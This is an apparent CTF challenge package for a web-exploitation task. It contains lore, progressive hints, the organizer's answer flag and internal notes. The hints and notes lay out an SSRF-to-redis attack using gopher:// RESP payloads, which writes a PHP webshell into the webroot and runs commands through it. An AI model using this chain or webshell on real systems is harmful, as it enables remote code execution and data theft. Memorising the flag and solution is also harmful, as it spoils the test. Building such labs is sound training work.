# Challenge Description — CTFd

## Name

Gopher Hole

## Category

Web Exploitation

## Difficulty

Hard

---

## Description (lore)

> **Gopher Hole — Network Ops Memo #882**
>
> At the edge of the office network sits a small relay. Its whole job is to
> fetch a page when someone asks. A glorified `curl` with a web form on top.
> It was built for the marketing team to preview external sites without
> leaving the building. Nobody thought much about what else it could reach.
>
> Behind the firewall, where the relay's wires run, there is a cache. A
> quiet little data store that holds session tokens and cached pages. It has
> no password. It never needed one — nobody outside the building could reach
> it. Until now.
>
> The cache is a key-value store. It can be told where to write its backup
> file. And it happens to share a folder with the web server that serves the
> company's public homepage. A folder the web server will happily execute
> files from.
>
> The relay speaks http and https. But it also still speaks an old
> protocol from the 1990s — the one that burrows under the floorboards. The
> one that can carry raw bytes to any port.
>
> Fetch a page. Reach the cache. Drop a file. Make the front door run it.
>
> Target: http://TARGET:11024
>
> Flag format: `CODEX26{...}`

---

## Hints (maximum 3, progressive)

### Hint 1 — What lives behind the firewall? (cost ~30)

> The relay is an SSRF: it fetches whatever URL you give it, from inside the
> network. It is not limited to http/https — it shells out to a program that
> speaks many schemes. Probe the internal network. Try fetching
> `http://redis:6379/` and read the error that comes back: that is a key-value
> store answering on the wrong protocol.

### Hint 2 — The old protocol that burrows (cost ~60)

> The relay passes your URL to `curl`, and curl still speaks `gopher://`.
> A gopher URL of the form `gopher://redis:6379/_<bytes>` sends `<bytes>` raw
> to port 6379. redis speaks RESP: lines of `*<n>`, `$<len>`, then the data,
> all separated by `\r\n`. Chain `SET shell <php>` → `CONFIG SET dir
> /var/www/html` → `CONFIG SET dbfilename shell.php` → `SAVE`. Encode the
> `\r\n` as `%0d%0a`. Double-encode: the app decodes once, curl decodes again.

### Hint 3 — The front door runs what you drop (cost ~90)

> The redis backup file lands in `/var/www/html`, served by Apache with PHP.
> Drop `<?php system($_GET["cmd"]); ?>` as `shell.php`, then request
> `http://TARGET:11023/shell.php?cmd=cat+/flag.txt`. The binary RDB header
> before `<?php` is harmless — PHP only executes inside the tags. The flag is
> at `/flag.txt` in the web container.

---

## Flag (organizer, do NOT expose in CTFd)

```
CODEX26{ssrf_t0_r3d1s_t0_r3m0t3_c0d3}
```

---

## Organizer notes (internal)

- Three services in `docker-compose.yml`:
  - `app` (Flask SSRF, port 11024) — `/fetch?url=...` runs `curl -s <url>`.
    Blacklists `localhost`/`127.`/`0.0.0.0`/`::1`/`internal`/`metadata`/
    `169.254`/`flag`/`admin`/`secret` and the `file:`/`dict:` schemes.
    `gopher://` is allowed (that is the vuln).
  - `redis` (redis:7, internal only, `protected-mode no`, runs as root, shares
    the `webroot` volume at `/var/www/html`).
  - `web` (php:8.3-apache, port 11023) — serves `/var/www/html`, flag at
    `/flag.txt` (444) injected from `FLAG` env at boot.
- Intended chain: SSRF recon (`http://redis:6379/`) → gopher RESP payload
  (`flushall`, `SET shell <php>`, `CONFIG SET dir /var/www/html`, `CONFIG SET
  dbfilename shell.php`, `SAVE`) → GET `shell.php?cmd=cat /flag.txt`.
- Solver: `solver/solve.py`. Reference webshell: `<?php system($_GET["cmd"]); ?>`.
- Do NOT leak that `gopher://` is unblocked or that redis has no password —
  that is the core of the challenge. Hints 1-2 reveal them; gate by cost.
